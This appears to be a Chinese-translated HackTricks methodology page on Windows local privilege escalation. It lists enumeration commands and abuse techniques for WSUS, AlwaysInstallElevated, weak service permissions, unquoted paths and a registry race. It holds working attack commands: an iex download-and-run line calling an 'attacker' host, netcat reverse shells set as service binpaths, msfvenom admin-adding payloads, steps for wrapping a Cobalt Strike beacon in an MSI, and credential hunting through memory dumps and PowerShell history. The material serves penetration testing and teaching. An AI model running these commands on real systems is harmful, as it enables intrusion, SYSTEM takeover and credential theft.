# Windows 本地权限提升

{{#include ../../banners/hacktricks-training.md}}

### **查找 Windows 本地权限提升向量的最佳工具：** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Windows 初始理论

### Access Tokens

**如果你不知道 Windows Access Tokens 是什么，请在继续之前阅读以下页面：**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**有关 ACLs - DACLs/SACLs/ACEs 的更多信息，请查看以下页面：**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**如果你不知道 Windows 中的 integrity levels 是什么，在继续之前应先阅读以下页面：**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows 安全控制

Windows 中有不同的东西可能会**阻止你枚举系统**、运行可执行文件，甚至**检测你的活动**。在开始权限提升枚举之前，你应该**阅读**以下**页面**并**枚举**所有这些**防御** **机制**：


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

通过 `RAiLaunchAdminProcess` 启动的 UIAccess 进程可以被滥用，在绕过 AppInfo secure-path 检查时无需提示即可达到 High IL。这里查看专门的 UIAccess/Admin Protection bypass 流程：

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation 可被滥用，实现任意 SYSTEM registry write（RegPwn）：

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

较新的 Windows 版本还引入了一条 **SMB arbitrary-port** LPE 路径，其中本地特权 NTLM authentication 会通过重用的 SMB TCP connection 进行反射：

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## 系统信息

### Version info enumeration

检查 Windows 版本是否存在任何已知漏洞（也要检查已应用的 patches）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

这个 [site](https://msrc.microsoft.com/update-guide/vulnerability) 很适合用来搜索 Microsoft security vulnerabilities 的详细信息。这个数据库包含 4,700 多个 security vulnerabilities，显示了 Windows 环境所带来的**巨大 attack surface**。

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

环境变量中保存了任何 credential/Juicy info 吗？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell 历史记录
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript files

你可以在 [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) 学习如何启用它
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell 模块日志

PowerShell pipeline 执行的详细信息会被记录，包括执行的命令、命令调用以及部分脚本内容。不过，完整的执行细节和输出结果可能不会被捕获。

要启用此功能，请按照文档中 "Transcript files" 部分的说明进行操作，并选择 **"Module Logging"** 而不是 **"Powershell Transcription"**。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
要查看 PowersShell 日志中的最后 15 个事件，你可以执行：
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

脚本执行的完整活动和完整内容记录会被捕获，确保每个代码块在运行时都会被记录。这个过程保留了每项活动的全面审计轨迹，对取证和分析恶意行为很有价值。通过在执行时记录所有活动，可以提供对该过程的详细洞察。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block 的日志事件可以在 Windows Event Viewer 中的路径找到：**Application and Services Logs > Microsoft > Windows > PowerShell > Operational**。\
要查看最近 20 个事件，你可以使用：
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internet 设置
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### 驱动器
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

如果更新不是通过 http**S** 而是通过 http 请求，你就可以入侵该系统。

首先在 cmd 中运行以下命令，检查网络是否使用非 SSL 的 WSUS 更新：
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
或者在 PowerShell 中：
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
如果你收到如下回复之一：
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Many enterprise agents expose a localhost IPC surface and a privileged update channel. If enrollment can be coerced to an attacker server and the updater trusts a rogue root CA or weak signer checks, a local user can deliver a malicious MSI that the SYSTEM service installs. See a generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) here:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` exposes a localhost service on **TCP/9401** that processes attacker-controlled messages, allowing arbitrary commands as **NT AUTHORITY\SYSTEM**.

- **Recon**: confirm the listener and version, e.g., `netstat -ano | findstr 9401` and `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: place a PoC such as `VeeamHax.exe` with the required Veeam DLLs in the same directory, then trigger a SYSTEM payload over the local socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
该服务将命令作为 SYSTEM 执行。
## KrbRelayUp

在 Windows **domain** 环境中，存在一个 **local privilege escalation** 漏洞，且需满足特定条件。这些条件包括：环境中未强制启用 **LDAP signing**，用户拥有允许其配置 **Resource-Based Constrained Delegation (RBCD)** 的 self-rights，以及用户能够在该 domain 中创建 computer。需要注意的是，这些 **requirements** 在 **default settings** 下即可满足。

在 [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) 查找 **exploit in**

有关攻击流程的更多信息，请查看 [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** 这 2 个 register 已启用（值为 **0x1**），那么任何权限级别的用户都可以以 NT AUTHORITY\\**SYSTEM** 身份 **install**（execute）`*.msi` 文件。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
如果你有一个 meterpreter session，你可以使用模块 **`exploit/windows/local/always_install_elevated`** 来自动化这个技术

### PowerUP

使用 power-up 中的 `Write-UserAddMSI` 命令在当前目录中创建一个 Windows MSI binary 来提升权限。这个脚本会写出一个预编译的 MSI installer，它会提示进行用户/组添加（因此你需要 GIU access）：
```
Write-UserAddMSI
```
Just execute the created binary to escalate privileges.

### MSI Wrapper

阅读本教程，了解如何使用此工具创建一个 MSI wrapper。注意，如果你只是想执行 command lines，你也可以 wrap 一个 "**.bat**" 文件。


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** with Cobalt Strike or Metasploit 一个新的 Windows EXE TCP payload 到 `C:\privesc\beacon.exe`
- 打开 **Visual Studio**，选择 **Create a new project**，然后在搜索框中输入 "installer"。选择 **Setup Wizard** 项目并点击 **Next**。
- 给项目起一个名字，比如 **AlwaysPrivesc**，位置使用 **`C:\privesc`**，选择 **place solution and project in the same directory**，然后点击 **Create**。
- 一直点击 **Next**，直到到达第 3 步（共 4 步，选择要包含的文件）。点击 **Add** 并选择你刚生成的 Beacon payload。然后点击 **Finish**。
- 在 **Solution Explorer** 中选中 **AlwaysPrivesc** 项目，在 **Properties** 中将 **TargetPlatform** 从 **x86** 改为 **x64**。
- 你还可以修改其他属性，例如 **Author** 和 **Manufacturer**，这会让已安装的 app 看起来更合法。
- 右键单击该项目并选择 **View > Custom Actions**。
- 右键单击 **Install** 并选择 **Add Custom Action**。
- 双击 **Application Folder**，选择你的 **beacon.exe** 文件并点击 **OK**。这样可以确保在安装程序运行后立即执行 beacon payload。
- 在 **Custom Action Properties** 下，将 **Run64Bit** 改为 **True**。
- 最后，**build it**。
- 如果出现警告 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`，请确保你将平台设置为 x64。

### MSI Installation

要在 **background** 中执行恶意 `.msi` 文件的 **installation**：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
要利用此漏洞，你可以使用: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

这些设置决定了什么会被**记录**，所以你应该注意
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding，很值得了解日志会被发送到哪里。
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** 旨在用于**管理本地 Administrator 密码**，确保每台加入域的计算机上的每个密码都是**唯一、随机生成并定期更新**的。这些密码会安全地存储在 Active Directory 中，并且只有被通过 ACL 授予足够权限的用户才能访问，从而在获授权时查看本地 admin 密码。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

如果处于活动状态，**明文密码会存储在 LSASS** (Local Security Authority Subsystem Service) 中。\
[**关于本页中 WDigest 的更多信息**](../stealing-credentials/credentials-protections.md#wdigest)。
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

从 **Windows 8.1** 开始，Microsoft 为 Local Security Authority (LSA) 引入了增强保护，以**阻止**不受信任的进程**读取其内存**或注入代码，从而进一步保护系统。\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** 于 **Windows 10** 中引入。其目的是保护存储在设备上的凭据，防御诸如 pass-the-hash attacks 之类的威胁。| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### 缓存凭据

**域凭据**由 **Local Security Authority** (LSA) 进行身份验证，并由操作系统组件使用。当用户的登录数据通过已注册的安全包进行身份验证时，通常会为该用户建立域凭据。\
[**更多关于 Cached Credentials 的信息在这里**](../stealing-credentials/credentials-protections.md#cached-credentials)。
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## 用户与组

### 枚举用户与组

你应该检查你所属的任何组是否具有有趣的权限
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

如果你**属于某个 privileged group，你可能能够提升 privileges**。在这里了解 privileged groups 以及如何滥用它们来提升 privileges：


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**了解更多**关于什么是 **token**，请查看此页面：[**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
查看以下页面以**了解有趣的 tokens** 以及如何滥用它们：


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### 主文件夹
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### 密码策略
```bash
net accounts
```
### 获取剪贴板内容
```bash
powershell -command "Get-Clipboard"
```
## 运行中的进程

### 文件和文件夹权限

首先，列出进程时，**检查进程命令行中是否包含密码**。\
检查你是否可以**覆盖某个正在运行的二进制文件**，或者是否对该二进制文件所在文件夹具有写权限，以利用可能的 [**DLL Hijacking attacks**](dll-hijacking/index.html)：
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
始终检查是否有可能存在的[**electron/cef/chromium debuggers** 正在运行，你可以滥用它来提升权限](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md)。

**检查进程二进制文件的权限**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**检查进程二进制文件所在文件夹的权限（**[**DLL Hijacking**](dll-hijacking/index.html)**）**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### 内存 Password mining

你可以使用 sysinternals 的 **procdump** 创建正在运行的进程的 memory dump。像 FTP 这样的服务会将 **credentials 以明文形式保存在内存中**，尝试 dump 内存并读取 credentials。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 不安全的 GUI apps

**以 SYSTEM 运行的 Applications 可能允许用户启动 CMD，或浏览目录。**

Example: "Windows Help and Support" (Windows + F1), 搜索 "command prompt", 点击 "Click to open Command Prompt"

## Services

Service Triggers 让 Windows 在某些条件发生时启动一个 service（named pipe/RPC endpoint activity、ETW events、IP availability、device arrival、GPO refresh 等）。即使没有 SERVICE_START 权限，你也经常可以通过触发它们的 triggers 来启动特权 service。这里查看枚举和激活 techniques：

-
{{#ref}}
service-triggers.md
{{#endref}}

获取 services 列表：
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 权限

你可以使用 **sc** 来获取服务的信息
```bash
sc qc <service_name>
```
建议使用 _Sysinternals_ 的二进制 **accesschk** 来检查每个服务所需的权限级别。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
建议检查 "Authenticated Users" 是否可以修改任何 service:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### 启用 service

如果你遇到这个错误（例如 SSDPSRV）：

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

你可以使用它来启用：
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**请注意，服务 upnphost 依赖 SSDPSRV 才能工作（针对 XP SP1）**

**这个问题的另一种变通方法**是运行：
```
sc.exe config usosvc start= auto
```
### **修改服务二进制路径**

在 “Authenticated users” 组对某个服务拥有 **SERVICE_ALL_ACCESS** 的情况下，可以修改该服务的可执行二进制文件。要修改并执行 **sc**：
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### 重启服务
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
权限可以通过各种权限进行提升：

- **SERVICE_CHANGE_CONFIG**: 允许重新配置 service binary。
- **WRITE_DAC**: 允许重新配置权限，进而能够更改 service configurations。
- **WRITE_OWNER**: 允许获取所有权并重新配置权限。
- **GENERIC_WRITE**: 继承更改 service configurations 的能力。
- **GENERIC_ALL**: 也继承更改 service configurations 的能力。

对于此漏洞的检测和利用，可以使用 _exploit/windows/local/service_permissions_。

### Services binaries weak permissions

**检查你是否可以修改由 service 执行的 binary**，或者你是否对该 binary 所在的文件夹具有**写权限**（[**DLL Hijacking**](dll-hijacking/index.html)）**。**\
你可以使用 **wmic** 获取每个由 service 执行的 binary（不在 system32 中），并使用 **icacls** 检查你的权限：
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
你也可以使用 **sc** 和 **icacls**：
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### 服务 registry 修改权限

你应该检查你是否可以修改任何 service registry。\
你可以通过以下方式**检查**你对 service **registry** 的**权限**：
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
应检查 **Authenticated Users** 或 **NT AUTHORITY\INTERACTIVE** 是否拥有 `FullControl` 权限。如果有，则可以修改由该 service 执行的 binary。

要更改所执行的 binary 的 Path：
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

一些 Windows Accessibility 功能会创建按用户划分的 **ATConfig** keys，之后由一个 **SYSTEM** 进程将其复制到一个 HKLM session key。通过 registry **symbolic link race**，可以把这次特权写入重定向到 **任意 HKLM path**，从而获得任意 HKLM **value write** primitive。

关键位置（示例：On-Screen Keyboard `osk`）：

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` 列出已安装的 accessibility features。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` 存储用户可控的配置。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` 在 logon/secure-desktop transitions 期间创建，且用户可写。

Abuse flow (CVE-2026-24291 / ATConfig)：

1. 填充你希望由 SYSTEM 写入的 **HKCU ATConfig** value。
2. 触发 secure-desktop copy（例如 **LockWorkstation**），这会启动 AT broker flow。
3. 通过在 `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` 上放置一个 **oplock** 来 **Win the race**；当 oplock 触发时，将 **HKLM Session ATConfig** key 替换为指向受保护 HKLM target 的 **registry link**。
4. SYSTEM 将攻击者选择的 value 写入被重定向的 HKLM path。

一旦你拥有任意 HKLM value write，就可以通过覆盖 service configuration values 来 pivot 到 LPE：

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

选择一个普通用户可以启动的 service（例如 **`msiserver`**），然后在写入后触发它。**Note:** 公开的 exploit implementation 会在 race 过程中 **lock the workstation**。

示例工具（RegPwn BOF / standalone）：
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

如果你对某个 registry 拥有这个权限，这意味着**你可以从这个 registry 创建子 registry**。在 Windows services 的情况下，这**足以执行任意 code：**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

如果某个 executable 的 path 不在引号中，Windows 会尝试执行每个以空格前结束的部分。

例如，对于 path _C:\Program Files\Some Folder\Service.exe_，Windows 会尝试执行：
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
列出所有未加引号的 service path，不包括属于内置 Windows services 的那些：
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**你可以检测并利用** 这个漏洞，使用 metasploit: `exploit/windows/local/trusted\_service\_path` 你可以手动使用 metasploit 创建一个 service binary：
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 恢复操作

Windows 允许用户指定在服务失败时要执行的操作。此功能可以配置为指向一个 binary。如果这个 binary 可被替换，就可能进行 privilege escalation。更多细节可以在 [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) 中找到。

## Applications

### Installed Applications

检查 **binaries 的 permissions**（也许你可以覆盖其中一个并提升 privileges）以及 **folders** 的 permissions（[DLL Hijacking](dll-hijacking/index.html)）。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 写入权限

检查你是否可以修改某个 config file 来读取某个 special file，或者是否可以修改某个将由 Administrator account 执行的 binary (schedtasks)。

在系统中查找弱文件夹/文件权限的一种方法是：
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ 会自动加载其 `plugins` 子文件夹下的任何 plugin DLL。 如果存在可写的 portable/copy 安装，投放一个恶意 plugin 会在每次启动时于 `notepad++.exe` 内自动执行代码（包括从 `DllMain` 和 plugin callbacks 中执行）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**检查你是否可以覆盖某些将被不同用户执行的 registry 或 binary。**\
